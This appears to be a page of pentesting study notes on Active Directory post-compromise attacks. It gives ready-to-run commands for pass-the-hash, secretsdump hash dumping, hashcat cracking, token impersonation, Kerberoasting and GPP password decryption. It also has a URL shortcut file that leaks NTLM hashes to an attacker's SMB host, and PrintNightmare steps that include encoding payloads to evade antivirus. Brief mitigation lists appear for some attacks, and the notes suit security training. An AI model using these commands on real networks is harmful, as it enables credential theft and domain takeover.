---
layout: default
title: 03. Active Directory Post Compromise
nav_order: 2
has_children: false
parent: Active Directory
grand_parent: Pentesting
---

## 03.Active Directory Post Compromise


### Pass The Hash

Pass The Password / Pass The Hash

You can pass NTLM hashes but not NTLMv2 hashes.

#### Using crackmapexec

[Source](https://wiki.porchetta.industries/)

Can be used with password:

```bash
crackmapexec smb $IP/$CIDR -u username -d EVIL_DOMAIN -p password
```

Or with hashes:

```bash
crackmapexec smb $IP/$CIDR -u username -H hash --local-auth
```

Accessing another instance pwned could be done using [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) :

```bash
psexec.py evil/username:password@target_ip
```

#### Dumping hashes

It requires access to another host.

Using [secretdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) we could retrieve hashes from host:

```bash
secretdump.py evil/username:password@target_ip
```

It gives the SAM hashes and the LSA secrets of the host.

#### Cracking the hashes

Using hashcat:

```bash
hashcat -m 1000 hashes.txt rockyou.txt -O 
```

#### Only passing the hash

We will use only the second part of the hash:

![](/writings/docs/assets/Hashes.png)

![](docs/assets/Hashes.png)

Using crackmapexec:
```bash
crackmapexec smb $IP/$CIDR -u "Username" -H <hash> --local-auth
```

We could try to get a shell access using only the hash and psexec:

```bash
psexec.py "username":@target_ip -hashes LMHASH:NTHASH
```

(`LMHASH:NTHASH` correspond to the full hash retrieve previously)

#### Mitigations

- Limit account reuse
- Utilize strong password
- Implement Privilege Access Management (PAM)


### Token Impersonation

Token are temporary key allowing access to system / network without having to provide credentials.

There is 2 types:
- Delegate - Create to login to a machine / using RDP
- Impersonate - "Non interractive", attaching network drive or domain logon script

#### Using Incognito

Require a shell on a machine.
From an existing metasploit session, we could use the load command to load the `incognito` tool inside our target.

Once the tool loaded, we could start by listing the tokens available: 

```bash
list_tokens -u
```

Then from this list we could select a user we want to impersonate:

```bash
impersonate_token evil\\administrator
```

Metasploit handle everything for us. 

#### Mitigation

- Limit user/group token creation permission
- Account tiering 
- Local admin restriction


### Kerberoasting 

![](/writings/docs/assets/Pasted%20image%2020230223184254.png)
![](docs/assets/Pasted%20image%2020230223184256.png)

#### Get SPNs & Dump hash

Using GetUserSPNs.py from Impact we could simply run: 

```bash
python3 GetUserSPNs.py <DOMAIN/username:password> -dc-ip $IP -request
```

We should receive the hash quickly.

##### Crack the hash

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

#### Mitigation

- Strong password
- Least Privilege 


### GPP / cPassword Attacks (MS14-025)

#### Explanation 

- Allow admin to create policy using embeded credentials.
- Encrypted and stored in file name cPassword
- The key was released by error 
- So password could be decripted
- Patched by MS14-025

[Source](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)


#### Exploitation 

Our goal is to retrieve the `groups.xml` containing the cPasswords vulnerable to the attack. 
Then from this file we retrieve the hash and we just have to run: 

```bash
gpp-decrypt <hash>
```

Then with the credential we could try to retrive more information using: 
- psexec
- GetUserSPNs

### URL File Attacks

Require one of the following:

- Compromise user account
-  Open file share

#### Exploitation

Save the following file in a file name : `"@test.ur"`

```sh
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\<your_ip>\%USERNAME%.icon 
IconIndex=1
```

Upload it to the share where you have the permission to read. 

Launch responder and you should start receiveing hashes. 

### PrintNightmare (CVE-2021-1675) Walkthrough

- [Python Code to RCE](https://github.com/cube0x0/CVE-2021-1675)
- [Powershell - Code to RCE](https://github.com/calebstewart/CVE-2021-1675)

#### Exploitation

1. Create the payload using msfvenom, the payload should be a `.dll`  file.
2. Wait for the session using netcat 
3. Expose the dll file via a samba server using impacket (must have smb2 support)
4. Run the python script to exploit (AV might detect it, so the payload might need to be encoded to bypass the AV)



### Mimikatz

[Repository](https://github.com/gentilkiwi/mimikatz)

- Tool to view and steal credential
- Generate Kerberoast ticket 
- Perform attacks (PassTheHash, SilverTicket, GoldenTicket, ...)
- Dumps credential stored in memory 




